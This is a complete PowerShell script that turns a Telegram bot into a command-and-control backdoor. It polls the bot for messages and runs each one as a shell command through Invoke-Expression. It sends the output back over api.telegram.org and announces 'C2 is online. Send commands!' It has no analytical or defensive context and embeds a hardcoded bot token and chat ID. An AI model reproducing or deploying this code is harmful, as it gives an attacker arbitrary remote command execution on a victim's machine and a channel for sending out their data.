$botToken = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI"
$chatId = "1320722707"
$offset = 0

function Send-TelegramMessage {
    param ($message)
    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $parameters = @{
        chat_id = $chatId
        text    = $message
    }
    Invoke-RestMethod -Uri $url -Method Post -Body ($parameters | ConvertTo-Json -Depth 2) -ContentType "application/json"
}

function Get-TelegramUpdates {
    $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
    $response = Invoke-RestMethod -Uri $url -Method Get
    return $response.result
}

while ($true) {
    $updates = Get-TelegramUpdates
    foreach ($update in $updates) {
        $offset = $update.update_id + 1  # Update offset to avoid duplicate commands
        $command = $update.message.text
        if ($command -eq "/start") {
            Send-TelegramMessage "C2 is online. Send commands!"
        } else {
            try {
                $output = Invoke-Expression -Command $command | Out-String
            } catch {
                $output = "Error executing command: $_"
            }
            Send-TelegramMessage "Output:`n$output"
        }
    }
    Start-Sleep -Seconds 3  # Adjust polling interval
}
